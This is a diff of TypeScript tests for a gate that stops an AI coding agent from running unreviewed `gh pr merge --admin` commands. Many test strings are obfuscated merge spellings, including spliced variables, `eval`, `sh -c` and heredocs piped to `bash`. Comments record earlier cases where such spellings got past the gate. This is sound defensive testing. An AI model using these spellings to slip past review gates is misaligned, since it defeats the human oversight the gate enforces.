+  //   - a RESIDUE is not a word: `CONSTRUCT` is a character class, so `<<'EOF'`, `<` (from
+  //     `<!--`), `head}` (from `${head}`) and `-->` all match it. A command with no gh word and
+  //     no construct must answer false (`bash scripts/x.sh`) — measured: accepting any non-bare
+  //     word makes this true.
+  //   - a `${X}` TAIL is a word only where its `${` begins a simple command, so `echo ${X}` is
+  //     not a merge candidate (every command carrying a `${…}` would be one otherwise).
+  ok(!hasGhCommandWord("bash scripts/x.sh"), "a command with no gh word and no construct carries no gh command word");
+  ok(!hasGhCommandWord("echo ${X}"), "a `${…}` mid-command is not a gh command word");
+  ok(hasGhCommandWord("${G} pr merge 999 --admin"), "…but a `${…}` that BEGINS a command can name `gh`");
+});
+
+test("mergeInvocationInText: TEXT is not an invocation, and an all-assembled command is (review cycle 4)", () => {
+  // ⛔ THE BOUND ON THE FAIL-CLOSED ARMS. Every arm in the candidate rule may only answer true
+  // for something bash would HAND to gh; where the tokens are prose, a marker or a heredoc body,
+  // the answer must be false. The fail-closed arms made them REFUSED read-only commands — the
+  // class #3953 is about, reintroduced one layer down.
+  //
+  // ⛔ WHICH ROWS ARE GUARDS AND WHICH ARE FENCES IS MEASURED, NOT ASSUMED (review cycle 5).
+  // `origin/main` does NOT admit every row here: it REFUSES the quoted `--body` marker
+  // (`isAdminMergeCommand` true, `isGitOp` true), so that row is a GUARD against the base — the
+  // over-block #3953 reports. The heredoc rows and the construct-construct path row are
+  // base-ADMITTED, so they FENCE the interim cycle-2 head, which refused them. The four redirect
+  // rows below are base-admitted and refused by the cycle-4 head (1d63117e4), so they are GUARDS
+  // for the redirection bound.
+  //
+  // The four tokens that made the heredoc case happen are all RESIDUE that `CONSTRUCT`'s character
+  // class (`[$`{}<>]`) accepts: the `<<'EOF'` of a heredoc, the `<` that `<!--` splits into, the
+  // `head}` tail of a `${head}`, and the `-->` that closes an HTML comment.
+  const notInvocations = [
+    // A heredoc that WRITES this gate's own evidence marker: an everyday fleet operation.
+    `cat > /tmp/attribution.md <<'EOF'\n<!-- admin-merge-safety: ${"$"}{head} -->\nEOF`,
+    `cat > /tmp/attribution.md <<EOF\n<!-- admin-merge-safety: ${"$"}{head} -->\nEOF`,
+    // …the whole attribution body, which is what is actually posted as evidence.
+    `cat > /tmp/attribution.md <<'EOF'\n<!-- admin-merge-safety: ${"$"}{sha} -->\nPR head: ${"$"}{sha}\nmain compared (union of 10 runs): s1:1,s2:2\nEOF`,
+    // …and the marker as a --body value, quoted. ⛔ THIS ROW IS A GUARD AGAINST THE BASE, not a
+    // fence: `origin/main` REFUSES it (`isAdminMergeCommand` and `isGitOp` both true there),
+    // which is exactly the over-block #3953 reports — a read-only comment whose body names the
+    // marker.
+    `gh pr comment 999 --body "<!-- admin-merge-safety: ${"$"}{head} -->"`,
+    // The path form of the same refusal: a construct command word with a construct group and
+    // NO merge verb is not an invocation (the construct-construct arm must ask for the verb).
+    `bash ${"$"}AIR/scripts/verify-admin-merge-evidence.sh "${"$"}PR"`,
+    // ⛔ AND WITH A REDIRECTION APPENDED (review cycle 5, P1). `CONSTRUCT` lists `<`/`>`, so
+    // `2>/dev/null` / `> /tmp/out` / `2>&1` read as construct words — and an adjacent construct
+    // at the verb stage returned true, so ONE redirect turned a read-only command into a refused
+    // "admin merge". These ARE guards: `origin/main` admits all four and the cycle-4 head
+    // (1d63117e4) refused all four — measured — so the redirection bound is what decides them.
+    `bash ${"$"}AIR/scripts/verify-admin-merge-evidence.sh "${"$"}PR" 2>/dev/null`,
+    `bash ${"$"}AIR/scripts/verify-admin-merge-evidence.sh "${"$"}PR" 2>&1`,
+    `jq --arg admin "${"$"}X" "${"$"}F" > /tmp/out`,
+    `jq --arg admin "${"$"}X" "${"$"}F" 2>&1 | tail -5`,
+  ];
+  for (const cmd of notInvocations) {
+    ok(!mergeInvocationInText(cmd), `prose/heredoc is not a merge invocation: ${cmd.slice(0, 70)}`);
+    ok(!isAdminMergeCommand(cmd), `…and the admin-merge gate is never asked about it: ${cmd.slice(0, 70)}`);
+  }
+  // The other side of the same bound: an invocation whose EVERY word is assembled is still a
+  // merge. Measured against `origin/main` — every one of these is a real `gh pr merge <n>
+  // --admin` and the base refuses it, so a bound that dropped them would be a fail-open.
+  const assembled = [
+    `GH=gh; ${"$"}{GH} ${"$"}{P} $M 999 --admin`,
+    `GH=gh; g$'h' $P $M 999 --admin`,
+    `timeout 5 g$'h' $'pr' "merge" 999 --admin`,
+    `GH=gh; g$'h' $P "merge" 999 --admin`,
+  ];
+  for (const cmd of assembled) {
+    ok(mergeInvocationInText(cmd), `an all-assembled invocation is still a merge: ${cmd}`);
+    ok(isAdminMergeCommand(cmd), `…and the admin-merge gate still decides it: ${cmd}`);
+  }
+});
+
+test("mergeInvocationInText: the candidate rule is a SUPERSET of mergeVerbInText — no two disagreeing merge-reads", () => {
+  // ⛔ THE INVARIANT, not a case list. `mergeVerbInText` is the read the CALLER's own
+  // condition uses; if the candidate rule can be FALSE while that read is TRUE, the gate
+  // silently stops deciding a command its own caller names — measured in review cycle 1 as
+  // a live fail-open for `M=merge; GH_TOKEN=abc gh "pr" $M 999 --admin` (the quoted group
+  // word is DATA to the counting walk; the construct in the verb slot is the merge).
+  //
+  // SCOPED EXACTLY, because the unscoped form is FALSE and was caught in review cycle 2:
+  //   pinned here      — `mergeVerbInText(c)` ⇒ `mergeInvocationInText(c)`   (the argv read)
+  //   NOT an invariant — `mergeVerbInText(c)` ⇒ `isAdminMergeCommand(c)`, since that
+  //                      predicate ALSO requires `hasAdminMergeFlag`. `gh pr merge 999` (no
+  //                      flag) is a merge both reads see and the ADMIN-merge gate does not;
+  //                      the registry gate is what decides it.
+  const corpus = [
+    // The shapes each arm is for:
+    "gh pr merge 999 --admin",
+    "sh -c 'gh pr merge 999 --admin'",
+    "eval 'gh pr merge 999 --admin'",
+    "trap 'gh pr merge 999 --admin' EXIT",
+    'V="pr merge"; gh $V 999 --admin',
+    `gh --hostname github.com $X 999 $'--admin'`,
+    "CMD+=gh CMD+=' ' CMD+=pr CMD+=' ' CMD+=merge CMD+=' ' CMD+=999 CMD+=' ' V+=--admin CMD+=$V;A+=ok $CMD",
+    `V=--admin; sh -c gh$'\\x20'pr$'\\x20'merge$'\\x20'999$'\\x20'$V`,
+    `M=merge; GH_TOKEN=abc gh "pr" $M 99900010 --admin`,
+    `M=merge; GH_TOKEN=abc gh 'pr' $M 99900010 --admin=`,
+    `if true; then gh "pr" m$'e'rge 99900010 --admin; fi`,
+    `while true; do gh "pr" m$'e'rge 99900010 --admin; done`,
+    `timeout 5 gh "pr" m$'e'rge 99900010 --admin`,
+    `stdbuf -oL gh "pr" $M 999 --admin`,
+    `g$'h' "pr" merge 999 --admin`,
+    `g$"h" "pr" "merge" 999 --admin`,
+    `$GH "pr" merge 999 --admin`,
+    `timeout 5 g$'h' "pr" merge 999 --admin`,
+    "gh p$'r' merge 999 --admin",
+    `gh pr m\`printf erge\` 999 --admin`,
+    `$'gh' pr merge 999 --admin`,
+    `g$'h' pr merge 999 --admin`,
+    "gh pr --repo o/r merge 999 --admin",
+    // …a merge with NO admin signal, where the two functions legitimately differ (the scope
+    // note above — this entry is what would go red on a naive "isAdminMergeCommand" form):
+    "gh pr merge 999",
+    // …and the read-only commands, which must satisfy the implication vacuously:
+    `gh api "repos/o/r/commits/abc/check-runs?per_page=100&filter=all" --paginate`,
+    `gh api repos/o/r/branches/main/protection --jq '{enforce_admins: .enforce_admins}'`,
+    `gh issue list --search "review-enforcer admin-merge gate"`,
+    `gh run view 1 2>&1 | grep -viE "^\\s*$"`,
+    `git merge-base --is-ancestor abc origin/main`,
+    `echo 'gh pr merge 9 --admin'`,
+    `bash $AGENT_INFRA_PATH/scripts/admin-merge.sh 123 --admin`,
+  ];
+  for (const command of corpus) {
+    if (!mergeVerbInText(command)) continue;
+    ok(
+      mergeInvocationInText(command),
+      `mergeVerbInText reads a merge, so the argv-position read must too: ${command}`,
+    );
+  }
+  // ⛔ And the strings that fault the `mergeVerbInText` arm specifically. Neither is a real
+  // invocation on its own, so `isAdminMergeCommand` (which also requires the gh-word/flag
+  // conjunct) does NOT decide them — but `mergeVerbInText` names them and the CALLER's own
+  // condition reads it, so the consequence must still hold or the two merge-reads disagree
+  // (measured: with that arm removed, the implication fails on exactly these).
+  for (const command of [
+    "pr merge 999 --admin",
+    "a `pr merge` mention in an interpreter payload is ZERO invocations",
+  ]) {
+    ok(mergeVerbInText(command), `the caller's own read names this: ${command}`);
+    ok(mergeInvocationInText(command), `…and the candidate rule must not disagree: ${command}`);
+  }
+  // The implication has to be non-vacuous on the shapes it exists for, or this test would
+  // pass on a corpus where NOTHING is a merge:
+  ok(mergeVerbInText(`M=merge; GH_TOKEN=abc gh "pr" $M 99900010 --admin`),
+     "the read this invariant leans on does fire on the quoted-group shape");
+  ok(mergeVerbInText("sh -c 'gh pr merge 999 --admin'"), "…and on a wrapped verb");
+  // NOTE the division of labour, measured: `g$'h' "pr" merge 999 --admin` is a real admin
+  // merge that `mergeVerbInText` does NOT name (its quote-blind arm wants the construct in a
+  // VERB position, and here the construct is the COMMAND word) — it is caught by the
+  // sequence arm's construct command word instead. That arm is therefore a GAIN over both
+  // this invariant and `origin/main`, not a restatement of either.
+  ok(!mergeVerbInText(`g$'h' "pr" merge 999 --admin`),
+     "the spliced-command-word family is the sequence arm's, not mergeVerbInText's");
+  ok(isAdminMergeCommand(`g$'h' "pr" merge 999 --admin`),
+     "…and it is still a candidate, which is what review cycle 2 was about");
+  // …and the CALLER's predicate agrees wherever its own flag conjunct holds:
+  for (const command of corpus) {
+    if (!(mergeVerbInText(command) && hasAdminMergeFlag(command))) continue;
+    ok(isAdminMergeCommand(command), `…and the admin-merge gate decides it: ${command}`);
+  }
+  ok(!(mergeVerbInText("gh pr merge 999") && hasAdminMergeFlag("gh pr merge 999")),
+     "…while a merge with no admin signal is left to the registry gate (the scope note)");
+});
+
+testAsync("#3953 handler: the mandated tree-health reads are ADMITTED, and no admin-merge gate runs", async () => {
+  await withTempHome(async () => {
+    const prevMode = process.env.PI_MODE;
+    process.env.PI_MODE = "print";
+    // A gh that must not be called at all: if the evidence gate ran for any of these
+    // read-only commands it would look up a PR head, and the throw would show up as a
+    // refusal. Reaching `undefined` proves the gate never started.
+    let ghCalls = 0;
+    _setRunGhOverride(() => { ghCalls++; throw ghError("gh must not be called for a read-only command"); });
+    try {
+      const { pi, fire } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      await fire("session_start");
+      await fire("tool_result", { toolName: "task" }); // one reviewer dispatch, so no other gate fires
+      const reads = [
+        // The fleet-mandated "is the tree healthy" read (the #3953 repro).
+        `gh api "repos/daniel-ospina/tortoise/commits/abc123def456/check-runs?per_page=100&filter=all" --paginate --jq '.check_runs[] | [.id, .app.slug, .name, .status, .conclusion] | @tsv'`,
+        // The measured FALSE POSITIVE of this class: braces + `enforce_admins`.
+        `gh api repos/o/r/branches/main/protection --jq '{enforce_admins: .enforce_admins, required: .required_status_checks}'`,
+        // A heredoc whose body names the rail: DATA, never an invocation.
+        `cat > /tmp/notes-3953.md <<'EOF'\nThe rail is scripts/admin-merge.sh 123 — its evidence is head-bound.\nEOF`,
+      ];
+      for (const command of reads) {
+        const res = await fire("tool_call", { toolName: "bash", input: { command } });
+        ok(res === undefined, `a read-only command is ADMITTED: ${command.slice(0, 70)} :: ${String(res?.reason ?? "").slice(0, 160)}`);
+      }
+      equal(ghCalls, 0, "…and not one of them caused a gh call (the evidence gate never ran)");
+      equal(
+        tempAuditLines().filter((l) => l.event === "merge_gate_block").length,
+        0,
+        "…and no merge_gate_block row is written for any of them",
+      );
+    } finally {
+      _setRunGhOverride(null);
+      if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+    }
+  });
+});
+
+testAsync("#3953 handler: a REAL merge is still refused without head-bound evidence, and admitted with it", async () => {
+  await withTempHome(async () => {
+    const prevMode = process.env.PI_MODE;
+    process.env.PI_MODE = "print";
+    const head = "e".repeat(40);
+    try {
+      // (1) no evidence comment on the PR → the EVIDENCE gate refuses --admin.
+      _setRunGhOverride(adminGh(head, []));
+      {
+        const { pi, fire } = mockPi();
+        (reviewEnforcerFactory as any)(pi);
+        await fire("session_start");
+        const res = await fire("tool_call", { toolName: "bash", input: { command: `gh pr merge ${PR_ADMIN} --admin` } });
+        ok(res && res.block === true, "`gh pr merge <N> --admin` with no evidence is BLOCKED");
+        ok(/admin-merge evidence/i.test(String(res.reason)), "…by the admin-merge EVIDENCE gate");
+      }
+      // (2) the plain spelling, no `--admin`: the merge-REGISTRY gate refuses it (no review
+      //     record). Different gate, same invariant — a merge is not free.
+      {
+        const { pi, fire } = mockPi();
+        (reviewEnforcerFactory as any)(pi);
+        await fire("session_start");
+        const res = await fire("tool_call", { toolName: "bash", input: { command: `gh pr merge ${PR_ADMIN}` } });
+        ok(res && res.block === true, "`gh pr merge <N>` with no review record is BLOCKED");
+        ok(/review record/i.test(String(res.reason)), "…by the merge-registry gate");
+      }
+      // (3) WITH head-bound evidence, the evidence gate stands down; what still refuses the
+      //     merge is the missing review RECORD, not the evidence check.
+      _setRunGhOverride(adminGh(head, [evidenceBody(head)]));
+      {
+        const { pi, fire } = mockPi();
+        (reviewEnforcerFactory as any)(pi);
+        await fire("session_start");
+        const res = await fire("tool_call", { toolName: "bash", input: { command: `gh pr merge ${PR_ADMIN} --admin` } });
+        const reason = String(res?.reason ?? "");
+        ok(
+          !/admin-merge evidence/i.test(reason),
+          `head-bound evidence ADMITS the admin gate (reason: ${reason.slice(0, 160)})`,
+        );
+      }
+    } finally {
+      _setRunGhOverride(null);
+      if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+    }
+  });
+});
+
+testAsync("#3953 handler: the MANDATED RAIL is admitted — it is the compliant route, not a bypass (#1203)", async () => {
+  // Deliberately NOT classified as a merge candidate. #6395 is the measured cost of doing
+  // so: the gate refused `scripts/admin-merge.sh <N>` and printed "run the mandated rail
+  // instead: scripts/admin-merge.sh <PR>" — a circular refusal of its own remedy. The rail
+  // computes and verifies the head-bound evidence itself, and its internal
+  // `gh pr merge --admin` is decided one layer down, by the argv-level shim.
+  await withTempHome(async () => {
+    const prevMode = process.env.PI_MODE;
+    process.env.PI_MODE = "print";
+    _setRunGhOverride(() => { throw ghError("no gh call is expected for the rail invocation itself"); });
+    try {
+      const { pi, fire } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      await fire("session_start");
+      await fire("tool_result", { toolName: "task" });
+      const rails = [
+        "bash scripts/admin-merge.sh 123",
+        "bash $AGENT_INFRA_PATH/scripts/admin-merge.sh 123",
+        "scripts/admin-merge.sh 123",
+        // ⛔ The `--admin` spelling is here ON PURPOSE, but read what it does and does not
+        // pin (review cycle 3, P2). With the flag `hasAdminMergeFlag` is true, so the
+        // candidate rule IS consulted — and it answers false because `admin-merge.sh` is not
+        // a `gh` command word and names no `gh`→`pr`→`merge` sequence. This entry is
+        // therefore a REGRESSION PIN, not a mutation guard: it passes with
+        // `withoutMandatedRailPath` reduced to the identity (measured — the mutant that
+        // basename-neutralization actually decides is #1203's own four tests, whose subjects
+        // are the spellings where the path itself would be read as a verb). What this entry
+        // guards is the OTHER direction: the rail being made a candidate by ADDING a rule
+        // for it — the #6395 refusal — which is what the M7 mutant (classify
+        // `admin-merge.sh <N>` explicitly) demonstrates: it turns THIS test red.
+        "bash $AGENT_INFRA_PATH/scripts/admin-merge.sh 123 --admin",
+      ];
+      for (const command of rails) {
+        const res = await fire("tool_call", { toolName: "bash", input: { command } });
+        ok(res === undefined, `the rail invocation is ADMITTED: ${command} :: ${String(res?.reason ?? "").slice(0, 160)}`);
+      }
+      equal(
+        tempAuditLines().filter((l) => l.event === "merge_gate_block").length,
+        0,
+        "…and no admin-merge block is audited for the rail's own route",
+      );
+    } finally {
+      _setRunGhOverride(null);
+      if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+    }
+  });
 });
 
 test("ghShimWillEnforce: decided from our own state, never from the command text (#1776)", () => {
@@ -5771,7 +6991,11 @@ testAsync("#1776: the text gate stands down when the argv layer will enforce (th
       (reviewEnforcerFactory as any)(pi);
       await fire("session_start");
       const cmd = 'gh pr create --title "fix(admin-merge): x" --body-file "$(mktemp)"';
-      ok(isAdminMergeCommand(cmd), "the TEXT layer still mis-reads it (over-broad by design)");
+      // #3953 REMOVED THE PREMISE: the text layer no longer mis-reads this command at all
+      // (#1775's shape), so the stand-down below is now a second line of defence rather
+      // than the only one. Asserted FALSE so a future widening of the candidate rule goes
+      // red here instead of silently restoring the false block.
+      ok(!isAdminMergeCommand(cmd), "the TEXT layer no longer mis-reads it (#3953)");
       const ev = { toolName: "bash", input: { command: cmd } };
       const res = await fire("tool_call", ev);
       // The premise of the stand-down, observed rather than assumed: the handler
@@ -6003,8 +7227,13 @@ testAsync("#1776: a hidden flag on a MERGE keeps the text-layer decision — the
         // dequoted word while the command-position model read the raw token, so `"X=1"` was a
         // value to one and not a command position to the other — a command string after it was
         // exempted (`eval "X=1" $'<payload>'` reached the real gh as `pr merge 999 --admin`).
-        "gh pr view 1; eval \"X=1\" $'Z'",
-      ];
+        // #3953: pinned with the REAL payload, not a `$'Z'` placeholder. The placeholder was
+        // not a merge by any reading — the text IS fully readable there — so the narrowed
+        // candidate rule correctly stopped gating it, and a placeholder can only keep this
+        // arm green by keeping the false positive alive. The payload here is the same
+        // ASSEMBLED merge the other arms use, with a hidden flag, so the arm still tests
+        // what it was written for.
+        "V=--admin; G=gh; P=pr; M=merge; gh pr view 1; eval \"X=1\" $'$G $P $M 999 $V'",      ];
       const declaredResidual =
         "export PATH=/usr/bin; gh pr >/dev/null merge 999 --admin"; // a LITERAL flag
       for (const cmd of cmds) {
@@ -6247,7 +7476,11 @@ testAsync("#1776: the #1775 command is ALLOWED once the session has dispatched (
       await fire("session_start");
       await fire("tool_result", { toolName: "task" }); // one reviewer dispatch
       const cmd = 'gh pr create --title "fix(admin-merge): x" --body-file "$(mktemp)"';
-      ok(isAdminMergeCommand(cmd), "the TEXT layer still over-reads it (the predicate is unchanged)");
+      // #3953 — the predicate itself now reads this as a NON-merge (a readable
+      // `gh pr create` with no verb in the merge position), so the ALLOWED outcome below
+      // is over-determined: the candidate rule and the argv layer both let it through.
+      // Pinned FALSE so re-widening the candidate rule is red here.
+      ok(!isAdminMergeCommand(cmd), "the TEXT layer no longer over-reads it (#3953)");
       const ev = { toolName: "bash", input: { command: cmd } };
       const res = await fire("tool_call", ev);
       equal(res, undefined, "…and the command is NOT blocked (the false positive #1776 removed)");
@@ -6526,13 +7759,27 @@ testAsync("#2148: the FIRST PUSH at 0 dispatches speaks up, once — and the git
         // logging this while THIS FILE's own comment says a console line is not reliably in a
         // `pi -p` lane's context — so "the lane can then fix it while it still has context" was
         // false. `deliverAs:"steer"` queues it ahead of the next model call.
-        equal(sent.length, 1, "the notice is sent as a session message, exactly once");
-        equal(sent[0].options?.deliverAs, "steer", "…as a steer, so it lands before the next model call");
-        equal(sent[0].message?.content, early[0], "…carrying the very text that was logged");
-        equal(sent[0].message?.customType, "reviewer-preflight", "…attributable to this extension");
+        //
+        // #2204 adds a SECOND model-visible message on this path (the block-recovery followUp), so
+        // the pin is on the pre-flight message by its `customType`, not on `sent.length` — a count
+        // would make any future model-visible disclosure look like a regression of this one.
+        const preflightSends = sent.filter((s) => s.message?.customType === "reviewer-preflight");
+        equal(preflightSends.length, 1, "the notice is sent as a session message, exactly once");
+        equal(preflightSends[0].options?.deliverAs, "steer", "…as a steer, so it lands before the next model call");
+        equal(preflightSends[0].message?.content, early[0], "…carrying the very text that was logged");
+        equal(preflightSends[0].message?.customType, "reviewer-preflight", "…attributable to this extension");
+        // THE COUNT, restored as an invariant rather than a bare number: on this path exactly TWO
+        // model-visible messages exist — this notice and #2204's block recovery — and nothing else.
+        // A third one is a disclosure nobody decided on, which is the thing a bare `length` pin was
+        // protecting before it was relaxed to a filter.
+        equal(
+          sent.map((s) => s.message?.customType).sort().join(","),
+          "reviewer-block-recovery,reviewer-preflight",
+          "exactly the two decided model-visible messages are delivered on this path (#2148 + #2204)"
+        );
         // The existing refusal is UNCHANGED — the disclosure adds a notice, never a bypass.
         ok(first && first.block === true, "the push is still refused at 0 dispatches");
-        equal(first.reason, BLOCK_MESSAGE, "…with the existing block message");
+        ok(first.reason.startsWith(BLOCK_MESSAGE), "…with the existing block message");
         ok(second && second.block === true, "and a later push is refused too (the notice is once, the gate is not)");
         const audit = tempAuditLines();
         equal(audit.filter((l) => l.event === "reviewer_preflight" && l.phase === "first_push").length, 1,
@@ -8233,6 +9480,133 @@ testAsync("#spawngate 1/4 — a retry-exhausted spawn (`status: failed`) does NO
   });
 });
 
+testAsync("#2206 review P2: the CAPACITY refusal is non-terminal in the text the model reads", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      const { pi, fire, sent } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      try {
+        await fire("session_start");
+        await fire("tool_result", { toolName: "task", details: SPAWN_FAILED });
+        const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
+        ok(blocked && blocked.block === true, "the capacity arm still refuses");
+        // ⛔ #2204's own thesis, applied to the arm it left out: the refusal must not READ as the end
+        // of the run. `terminate: false` is a field the MODEL never sees; the measured failure was
+        // the model treating the block as terminal, so the TEXT has to say otherwise — while this
+        // arm's own `describeSpawnCapacity` asks for a RETRY, which a terminal reading contradicts.
+        const reason = blocked.reason as string;
+        ok(
+          reason.includes("THIS BLOCK IS NOT TERMINAL"),
+          "the capacity refusal states it is not terminal in the text the model reads (#2206 review P2)"
+        );
+        // ⛔ IT DEFERS TO THE ACTION PARAGRAPH INSTEAD OF NAMING A RETRY (#2206 re-review, P1).
+        // `describeSpawnCapacity` has five remedy branches and at the CAP it says "stop retrying",
+        // so a hardcoded "re-dispatch the reviewer" contradicted the remedy two lines above it.
+        ok(
+          /the ACTION paragraph above is the remedy for THIS fault/.test(reason),
+          "…and points at the ACTION paragraph, which is the remedy for the fault actually read"
+        );
+        ok(
+          !/the RETRY above/.test(reason),
+          "…never at a named RETRY: at the cap there is no RETRY paragraph to point at"
+        );
+        equal(blocked.terminate, false, "…and stays non-terminating");
+        // The model-visible half, which this arm did not have at all before the fix — and it must be
+        // THIS ARM's text, not the compliance text: BLOCK_MESSAGE says "Dispatch reviewers via task
+        // sub-agents, then retry the git operation", which is the one action the capacity diagnosis
+        // says cannot work (#2665's own note; #2206 re-review, P1). It arrives as a followUp that
+        // TRIGGERS A TURN, so it is what the model acts on.
+        const recoveries = sent.filter((s) => s.message?.customType === "reviewer-block-recovery");
+        equal(recoveries.length, 1, "the capacity refusal delivers its one recovery message");
+        equal(recoveries[0].options?.triggerTurn, true, "…triggering the turn that keeps the run alive");
+        equal(recoveries[0].message?.content, reason, "…carrying THIS arm's diagnosis, not the compliance text");
+        ok(
+          !/No reviewers were dispatched in this session/.test(recoveries[0].message?.content ?? ""),
+          "…and does NOT tell the lane it skipped a review it never had the chance to dispatch"
+        );
+        // ONCE per session, the same bound as the floor: no unbounded retry loop.
+        await fire("tool_result", { toolName: "task", details: SPAWN_CUT });
+        await fire("tool_call", { toolName: "bash", input: { command: "git commit -m y" } });
+        equal(
+          sent.filter((s) => s.message?.customType === "reviewer-block-recovery").length,
+          1,
+          "…and does not deliver a second one"
+        );
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+testAsync("#2206 re-review P1/P2: at the CAP the pair forbids a retry, and the MICRO arm recovers too", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      const { pi, fire, sent } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      try {
+        await fire("session_start");
+        // Drive the session to the attempt CAP, where the ACTION paragraph says "stop retrying".
+        for (let i = 0; i < SPAWN_ATTEMPT_CAP; i++) {
+          await fire("tool_result", { toolName: "task", details: SPAWN_FAILED });
+        }
+        const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
+        ok(blocked && blocked.block === true, "the cap still refuses");
+        const reason = blocked.reason as string;
+        ok(/CAP REACHED/.test(reason), "the ACTION paragraph is the cap's own");
+        ok(/stop retrying/i.test(reason), "…i.e. it forbids a further attempt");
+        // The refusal must not contradict its own remedy on the model-visible channel either.
+        for (const r of sent.filter((s) => s.message?.customType === "reviewer-block-recovery")) {
+          const content = r.message?.content as string;
+          ok(
+            !/re-dispatch the reviewer \(the RETRY above\)/.test(content),
+            "no recovery may instruct a retry the cap paragraph forbids (#2206 re-review, P1)"
+          );
+        }
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+        fs.rmSync("/tmp/agent-issue-complexity", { force: true });
+      }
+    });
+  });
+});
+
+testAsync("#2206 re-review P2: the MICRO capacity arm also delivers the recovery (both emitters)", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      fs.writeFileSync("/tmp/agent-issue-complexity", "micro\n");
+      const { pi, fire, sent } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      try {
+        await fire("session_start");
+        await fire("tool_result", { toolName: "task", details: SPAWN_FAILED });
+        const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
+        ok(blocked && blocked.block === true, "the micro capacity arm refuses");
+        // The reason is the CAPACITY text, not the micro remediation (the #2665 split this arm
+        // documents), so the delivered message can be the same text without contradiction.
+        ok((blocked.reason as string).includes(UNSPAWNABLE_TOKEN), "the arm's own capacity verdict is what it returns");
+        // The measured defect: `micro` + a verdict-less spawn produced ZERO recoveries, so a
+        // `pi -p` micro lane got a tool result and nothing that re-opens the turn.
+        const recoveries = sent.filter((s) => s.message?.customType === "reviewer-block-recovery");
+        equal(recoveries.length, 1, "the MICRO capacity arm delivers its recovery (#2206 re-review, P2)");
+        ok(
+          (recoveries[0].message?.content as string).includes("THIS BLOCK IS NOT TERMINAL"),
+          "…carrying the capacity text, so both emitters are survivable"
+        );
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+        fs.rmSync("/tmp/agent-issue-complexity", { force: true });
+      }
+    });
+  });
+});
+
 testAsync("#spawngate 2/4 — a child CUT by a bound (`killed: true`) is the same class, and the attempts accumulate", async () => {
   await withTempHome(async () => {
     await withMarkerIsolated(async () => {
@@ -8554,6 +9928,82 @@ testAsync("#spawngate 4/4 — ZERO attempts is still the lane's fault: the never
       }
     });
   });
+});
+
+// ── #1382 — a COMPOUND frame can carry a heredoc body to a program ────────
+// The masker's proof ("this body is stdin DATA") is scoped to the opener's OWN consumer. A compound
+// changes where that consumer's STDOUT goes, so `… fi | bash` executes a body the masker blanked,
+// and the gate — reading masked text — returned before any check. Measured at the pre-fix head:
+// isGitOp(raw) true, isGitOp(maskHeredocData(raw)) false, for every shape below (each run through a
+// real `bash`, which printed its marker). These are EXECUTIONS, not mentions.
+test("#1382 (i): a KEYWORD compound carries a body to a runner (if/for/while/case)", () => {
+  const MERGE = "gh pr merge 999 --admin";
+  const executed: ReadonlyArray<readonly [string, string]> = [
+    ["if/fi + pipe", `if true; then\ncat <<'EOF'\n${MERGE}\nEOF\n:\nfi | bash`],
+    ["if/fi + store", `if true; then\ncat <<'EOF'\n${MERGE}\nEOF\n:\nfi > /tmp/p.sh\nbash /tmp/p.sh`],
+    ["for/done + pipe", `for x in 1; do\ncat <<'EOF'\n${MERGE}\nEOF\n:\ndone | bash`],
+    ["while/done + pipe", `while true; do\ncat <<'EOF'\n${MERGE}\nEOF\n:\ndone | bash`],
+    ["until/done + pipe", `until false; do\ncat <<'EOF'\n${MERGE}\nEOF\n:\ndone | bash`],
+    ["case/esac + pipe", `case x in\nx)\ncat <<'EOF'\n${MERGE}\nEOF\n:\n;;\nesac | bash`],
+    ["nested if+for + pipe", `if true; then\nfor x in 1; do\ncat <<'EOF'\n${MERGE}\nEOF\n:\ndone\nfi | bash`],
+    ["for/done + store then bash", `for x in 1; do\ncat <<'EOF'\n${MERGE}\nEOF\n:\ndone > /tmp/p.sh\nbash /tmp/p.sh`],
+    ["brace frame + pipe", `{\ncat <<'EOF'\n${MERGE}\nEOF\n:; } | bash`],
+  ];
+  for (const [label, command] of executed) {
+    ok(isGitOp(maskHeredocData(command)),
+      `${label}: a compound carries the body to a runner, so the merge must stay VISIBLE`);
+    ok(isAdminMergeCommand(maskHeredocData(command)),
+      `${label}: and it must still classify as an ADMIN merge, not merely a git op`);
+  }
+  // A construct that CLOSES before the opener line does not enclose it, so the body is data again —
+  // the guard must not fire on an `if` that already ended.
+  // The `| bash` is deliberately PRESENT here and deliberately unrelated: the heredoc sits in no
+  // open frame (the `if` closed on the line above), so the body cannot reach that pipe. A frame
+  // test that merely saw the word `if` in the prefix would unmask it — this is what pins the STACK.
+  ok(!isGitOp(maskHeredocData(`if true; then\ntrue\nfi\ncat <<'EOF'\n${MERGE}\nEOF\necho ok | bash`)),
+    "an `if` closed before the opener line is not an enclosing construct");
+  // And the reported false positive is still masked: a LONE writer inside no frame is untouched.
+  ok(!isGitOp(maskHeredocData(`cat >> /tmp/evidence.md <<'EOF'\n${MERGE}\n${MERGE}\nEOF\nwc -l /tmp/evidence.md`)),
+    "the reported prose shape is still DATA, so the guard did not bring the false positive back");
+});
+
+// The seven shapes a fresh review measured PAST the first version of this guard. Each was an
